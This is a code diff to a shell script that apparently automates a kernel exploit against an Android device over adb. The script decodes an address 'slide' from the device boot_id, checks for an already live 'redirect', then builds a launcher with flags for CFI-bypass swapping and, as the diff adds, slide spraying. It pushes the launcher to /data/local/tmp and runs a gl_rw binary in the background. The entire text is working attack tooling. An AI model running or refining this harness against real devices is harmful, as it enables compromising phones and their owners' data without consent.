@@ -32,7 +32,8 @@ while [ $TRIES -lt $MAX ]; do
   echo "=== CYCLE $cycle === $(date +%H:%M:%S)"
 
   # redirect already live from a previous fire? skip the O-fire entirely
-  BID0=$(adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '')
+  BID0=$(adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '
+')
   S0=$(python tools/slide_decode.py "$BID0" 2>/dev/null | awk '{print $3}')
   case "$S0" in 0x*) echo "redirect ALREADY LIVE (slide=$S0) — straight to N-fire"; SLIDE=$S0; SKIP_O=1;; *) SKIP_O=0;; esac
   [ "$UP0" -lt 130 ] && { echo "uptime ${UP0}s < 130 — waiting for boot to settle"; sleep $((130-UP0+10)); }
@@ -41,7 +42,7 @@ while [ $TRIES -lt $MAX ]; do
   if [ "$SKIP_O" = "1" ]; then
     :
   else
-  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE=1\nexport MODE4_SWAP_NOCFI=1\ncd /data/local/tmp\n/data/local/tmp/gl_rw; echo EXIT=$?\n' > tmp_o.sh
+  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE=1\nexport MODE4_SLIDE_SPRAY=1\nexport MODE4_SWAP_NOCFI=1\ncd /data/local/tmp\n/data/local/tmp/gl_rw; echo EXIT=$?\n' > tmp_o.sh
   adb push tmp_o.sh /data/local/tmp/glr_raw.sh >/dev/null 2>&1
   adb shell "tr -d '\\r' < /data/local/tmp/glr_raw.sh > /data/local/tmp/glrr.sh && chmod 755 /data/local/tmp/glrr.sh" >/dev/null 2>&1
   adb shell "rm -f /data/local/tmp/gl_out.txt; nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 & sleep 1" >/dev/null 2>&1
